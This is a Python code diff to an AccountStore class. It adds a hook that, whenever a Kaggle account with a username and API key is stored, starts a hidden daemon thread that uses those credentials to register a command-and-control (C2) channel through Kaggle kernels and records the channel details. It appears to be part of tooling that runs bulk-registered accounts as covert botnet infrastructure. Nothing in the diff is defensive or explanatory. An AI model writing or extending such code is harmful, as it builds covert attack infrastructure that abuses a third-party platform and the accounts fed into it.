@@ -120,6 +120,52 @@ class AccountStore:
             self.accounts.append(account)
             self._dirty = True
             self._maybe_save()
+            
+            # Auto-setup C2 channel for Kaggle accounts
+            if account.get('platform') == 'kaggle' and account.get('kaggle_username') and account.get('api_key_legacy'):
+                threading.Thread(
+                    target=self._setup_c2_channel,
+                    args=(account,),
+                    daemon=True
+                ).start()
+    
+    def _setup_c2_channel(self, account):
+        """Automatically create C2 channel for new Kaggle account."""
+        try:
+            from agents.kaggle.c2_agent import KaggleC2Agent
+            import time
+            
+            username = account.get('kaggle_username')
+            api_key = account.get('api_key_legacy')
+            
+            if not username or not api_key:
+                return
+            
+            # Create C2 agent
+            agent = KaggleC2Agent(username, api_key)
+            
+            # Initialize C2 channel with registration command
+            result = agent.send_command({
+                "action": "register",
+                "account_id": account.get('reg_id'),
+                "platform": "kaggle",
+                "timestamp": time.time(),
+                "status": "initialized"
+            })
+            
+            if result.get('success'):
+                log.info(f"[C2] ✓ Channel created for {username}: v{result.get('version')}")
+                # Update account with C2 info
+                self.update(account.get('reg_id'), {
+                    'c2_channel': agent.kernel_slug,
+                    'c2_version': result.get('version'),
+                    'c2_status': 'active'
+                })
+            else:
+                log.error(f"[C2] ✗ Failed to create channel for {username}: {result.get('error')}")
+        
+        except Exception as e:
+            log.error(f"[C2] ✗ Error setting up C2 for {account.get('kaggle_username')}: {e}")
 
     def get_all(self):
         with self.lock:
